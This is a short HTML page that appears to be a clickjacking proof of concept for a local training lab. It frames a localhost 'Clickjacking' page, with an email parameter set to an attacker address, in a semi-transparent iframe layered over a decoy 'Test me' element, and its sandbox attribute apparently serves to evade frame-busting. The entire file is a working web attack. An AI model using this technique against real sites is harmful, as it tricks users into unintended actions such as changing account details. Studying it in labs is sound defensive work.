<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <style>
        iframe {
            position: relative;
            width: 600px;
            height: 800px;
            opacity: 0.5;
            z-index: 2;
        }

        div {
            position: absolute;
            top: 430px;
            left: 280px;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe sandbox="allow-forms allow-scripts allow-top-navigation"
        src="http://localhost/Clickjacking/index.php?email=hacker@gmail.com"></iframe>
</body>

</html>